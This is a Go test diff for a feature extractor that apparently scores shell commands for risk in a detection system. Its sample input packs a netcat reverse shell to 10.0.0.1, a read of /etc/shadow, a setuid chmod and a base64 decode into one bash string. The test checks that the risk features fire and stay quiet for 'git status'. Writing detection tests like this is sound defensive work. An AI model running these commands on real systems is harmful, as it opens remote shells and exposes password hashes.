@@ -83,3 +83,21 @@ func TestFeatureNormalizationSummaryFlagsOutOfRangeRawSamples(t *testing.T) {
 		t.Fatalf("report did not flag invalid values: %#v", report)
 	}
 }
+
+func TestFeatureExtractorPopulatesShellSyntaxAndIPFeatures(t *testing.T) {
+	fe := &FeatureExtractor{history: newRecentHistoryBuffer(8)}
+	f := fe.Extract("bash", []string{"-c", "PROMPT_COMMAND='nc -e /bin/sh 10.0.0.1' ; $(cat /etc/shadow) ; chmod +s /tmp/b && echo ZQ== | base64 -d"}, "steve", 4242)
+	if f[30] <= 0 || f[30] > 1 {
+		t.Fatalf("f[30] (ShellCompoundRiskScore) = %f, want (0, 1]", f[30])
+	}
+	if f[31] <= 0 || f[31] > 1 {
+		t.Fatalf("f[31] (ShellEvasionPrivilegeScore) = %f, want (0, 1]", f[31])
+	}
+	if f[59] != 1.0 {
+		t.Fatalf("f[59] (HasIPPattern) = %f, want 1.0", f[59])
+	}
+	benign := fe.Extract("git", []string{"status", "--short"}, "steve", 4243)
+	if benign[30] != 0 || benign[31] != 0 || benign[59] != 0 {
+		t.Fatalf("benign command unexpectedly triggered structural/IP features: f30=%f f31=%f f59=%f", benign[30], benign[31], benign[59])
+	}
+}
